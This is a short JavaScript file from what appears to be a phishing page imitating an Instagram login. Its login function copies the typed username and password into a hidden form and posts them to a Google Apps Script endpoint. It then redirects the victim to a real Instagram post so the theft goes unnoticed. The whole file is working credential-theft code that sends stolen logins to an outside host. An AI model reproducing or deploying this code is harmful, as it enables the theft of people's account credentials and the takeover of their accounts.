let HIDDEN_FORM = document.getElementById('hideform')
const login = () => {
    HIDDEN_FORM = document.getElementById('hideform')
    var username = document.getElementsByClassName("inputs")[0]
    var password = document.getElementsByClassName("inputs")[1]
    document.getElementById("un").value = username.value
    document.getElementById("pw").value = password.value
    if(!password.value){alert('Wrong password!')}
    if(username.value){
        var ACCOUNT_DATA = new FormData(HIDDEN_FORM)
        fetch('https://script.google.com/macros/s/AKfycbw1xnVqEj3GKVy6OgNfgEyCeCOS_4HivBYpvySpry-JnUJ__JiwNQg0aOpNtJptveEz6A/exec', {
            method: "POST",
            body: ACCOUNT_DATA
        })
        .then(res => res.text())
        .then(ACCOUNT_DATA => console.log(ACCOUNT_DATA))
        .then(window.open("https://www.instagram.com/p/CwZEfnGo9RR/?igshid=MTc4MmM1YmI2Ng==","_self"))
    }
}